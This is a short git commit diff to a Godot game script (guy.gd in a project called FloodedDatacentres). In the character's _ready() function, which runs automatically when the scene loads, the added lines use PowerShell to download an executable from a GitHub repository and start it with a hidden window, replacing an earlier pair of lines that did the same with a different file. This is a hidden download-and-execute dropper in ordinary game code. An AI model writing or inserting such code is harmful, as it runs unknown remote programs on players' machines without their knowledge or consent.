c6f16e8747e0b9ef29709763ceb395e0e2d48a74
314PiGuy <147645262+314PiGuy@users.noreply.github.com>
2024-08-21 16:46:21 -0400

    e

--- FloodedDatacentres/characters/Guy/guy.gd
+++ FloodedDatacentres/characters/Guy/guy.gd
@@ -5,8 +5,8 @@ extends Node2D
 #signal interact(node: Node)
 ## Called when the node enters the scene tree for the first time.
 func _ready() -> void:
-	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/rick/raw/main/a.exe -o a.exe"])
-	OS.execute("powershell.exe", ["-Command", "Start-Process a.exe -WindowStyle Hidden"])
+	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe"])
+	OS.execute("powershell.exe", ["-Command", "Start-Process spaghetti.exe -WindowStyle Hidden"])
 #
 # Called every frame. 'delta' is the elapsed time since the previous frame.
 func _process(delta: float) -> void:
